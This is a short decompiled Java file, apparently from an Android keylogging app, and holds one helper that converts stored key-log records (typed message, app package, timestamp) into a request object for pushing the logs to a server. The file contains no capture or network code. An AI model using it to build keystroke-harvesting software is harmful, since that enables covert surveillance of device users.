package com.hawkshaw.library.datalayer.models.accessibility;

import Y1.K;
import com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest;
import com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity;

public final class KeyLogKt {
    public static final PushKeyLogsRequest.KeyLog toRequest(KeyLogEntity keyLogEntity) {
        K.n(keyLogEntity, "<this>");
        return new PushKeyLogsRequest.KeyLog(keyLogEntity.getType(), keyLogEntity.getMessage(), keyLogEntity.getPackageName(), keyLogEntity.getTimestamp());
    }
}
